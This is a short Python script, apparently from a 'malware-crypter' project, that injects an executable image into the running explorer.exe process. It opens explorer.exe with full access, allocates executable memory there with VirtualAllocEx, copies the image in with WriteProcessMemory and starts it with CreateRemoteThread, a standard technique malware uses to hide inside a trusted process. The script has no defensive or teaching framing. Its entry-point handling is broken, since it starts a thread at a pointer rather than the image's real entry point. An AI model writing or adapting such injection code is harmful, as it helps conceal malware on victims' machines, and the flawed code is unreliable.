import psutil
import ctypes
import pefile
import win32api
import win32process
import win32con

for proc in psutil.process_iter():
    if proc.name() == "explorer.exe":
        process_id = proc.pid
        break
else:
    raise RuntimeError("Could not find explorer.exe process")



# Open the target process
process_handle = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, process_id)

# Load the executable into memory
pe = pefile.PE(r'C:\Users\John Emro\Documents\GitHub\malware-crypter\MW_onmemory\calculator.exe')
executable = pe.get_memory_mapped_image()
buffer_size = len(executable)

# Allocate memory in the target process
allocation_base = ctypes.windll.kernel32.VirtualAllocEx(process_handle, None, len(executable), 
                                        win32con.MEM_COMMIT | win32con.MEM_RESERVE, 
                                        win32con.PAGE_EXECUTE_READWRITE)
if not allocation_base:
    raise ctypes.WinError()

# Write the executable to the allocated memory
bytes_written = ctypes.c_ulong(0)
result = ctypes.windll.kernel32.WriteProcessMemory(process_handle, allocation_base, executable, buffer_size, ctypes.byref(bytes_written))
if not result or bytes_written.value != buffer_size:
    raise ctypes.WinError()

# Get a function pointer to the entry point of the executable
entry_point = ctypes.windll.kernel32.VirtualAllocEx(process_handle, None, ctypes.sizeof(ctypes.c_void_p),
                        win32con.MEM_COMMIT | win32con.MEM_RESERVE,
                        win32con.PAGE_EXECUTE_READWRITE)

ctypes.windll.kernel32.WriteProcessMemory(process_handle, entry_point, ctypes.addressof(ctypes.c_void_p(allocation_base)), ctypes.sizeof(ctypes.c_void_p), None)

# Call the entry point
ctypes.windll.kernel32.CreateRemoteThread(process_handle, None, 0, entry_point, None, 0, None)
